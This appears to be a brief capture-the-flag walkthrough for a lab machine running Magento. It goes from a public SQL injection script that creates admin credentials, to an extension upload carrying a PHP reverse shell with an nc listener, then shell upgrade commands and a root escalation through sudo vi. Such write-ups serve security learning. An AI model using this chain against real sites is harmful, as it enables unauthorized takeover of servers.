```
1. Port Scanning 80,22.
2. On port 80 Magento Website is running. So after some enumeration I found out it's admin page.
> http://10.10.10.140/index.php/admin
When I google for the vulnerablities I found SQLI and one script link[https://github.com/joren485/Magento-Shoplift-SQLI/blob/master/poc.py]

I modified the script it is uploaded in my github.

You can use whatever credentials you want to use, Using those credentials login to the admin Panel.

Go to system Select magento connect -> magneto connector -> you will get administrator portal -> login to this portal using same credentials.

Upload Magpleasure extension(refer to this link: 
> https://www.youtube.com/watch?v=BbVk67f0OCE

then edit php file with your reverse shell and start reverse shell listener:
> nc -lvp port_number 

then try "sudo -l" You will get to know that we can run vi using root without using root password

To upgrade your shell use following commands:

python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=screen #(lets you clear the screen)
export SHELL=bash

To allow keyboard shortcuts do this.
ctrl+z (background current session)
stty raw -echo
fg
fg

After seeing the output of sudo -l
follow these commands :
sudo vi /var/www/html/cron.sh
press esc and type
:set shell=/bin/bash (press enter)
:shell (press enter)
(voila you wil get root shell)
```
